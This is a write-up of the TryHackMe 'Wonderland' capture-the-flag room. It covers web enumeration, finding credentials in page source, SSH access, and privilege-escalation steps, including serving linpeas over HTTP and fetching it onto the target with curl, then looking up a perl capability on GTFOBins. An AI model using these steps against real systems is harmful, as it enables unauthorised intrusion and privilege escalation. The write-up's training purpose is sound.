Writeup for the Wonderland CTF Room on: https://tryhackme.com/

First we start by adding the ip to our /etc/hosts file.
Then we start our enumeration.

### Enumeration

## Nmap

We can see an open HTTP and SSH port.

[![https://imgur.com/jitshko.png](https://imgur.com/jitshko.png)](https://imgur.com/jitshko.png)

## Manual

Lets visit the site manually:
We dont see much.

[![https://imgur.com/11z0aWO.png](https://imgur.com/11z0aWO.png)](https://imgur.com/11z0aWO.png)

## Gobuster

Lets see what gobuster can reveal.

[![https://imgur.com/wFIBJg9.png](https://imgur.com/wFIBJg9.png)](https://imgur.com/wFIBJg9.png)

After checking the endpoints they dont seem to make to much sense to me.

But the /r endpoint tells us to keep going.

[![https://imgur.com/tE3tIbB.png](https://imgur.com/tE3tIbB.png)](https://imgur.com/tE3tIbB.png)

So lets see if we get further with recursive search.

## Dirbuster

[![https://imgur.com/80N9DDR.png](https://imgur.com/80N9DDR.png)](https://imgur.com/80N9DDR.png)

This looks prommising lets check it out.

In the source code we find credentials ! 

[![]](https://media.giphy.com/media/PjplWH49v1FS0/giphy.gif)

### Privilege Escalation

After logging in with SSH we can see the root.txt and a python script both owned by root.

[![https://imgur.com/0Q8Eaqt.png](https://imgur.com/0Q8Eaqt.png)](https://imgur.com/0Q8Eaqt.png)

We can see the other users on the machine:

[![https://imgur.com/i40U4qz.png](https://imgur.com/i40U4qz.png)](https://imgur.com/i40U4qz.png)

We are allowed to run the python script as the user rabbit without password.

[![https://imgur.com/1WhFACr.png](https://imgur.com/1WhFACr.png)](https://imgur.com/1WhFACr.png)

Lets take a closer look at the script:

The short version is:

import random

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)

I dont see how we can abuse this yet lets look further.
At this point i will just run linpeas.
Download it from here on your Host: 

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

In the same directory set up a http server with python:

Python3 -m http.server 1337

On your target go in the /tmp directory:

curl http://yourip:ip/linpeas.sh


There is a interisting capability set on perl:

[![https://imgur.com/68H4nts.png](https://imgur.com/68H4nts.png)](https://imgur.com/68H4nts.png)

When we check on GTFOBins on perl capabilities:

[![https://imgur.com/L8aSgEu.png](https://imgur.com/L8aSgEu.png)](https://imgur.com/L8aSgEu.png)


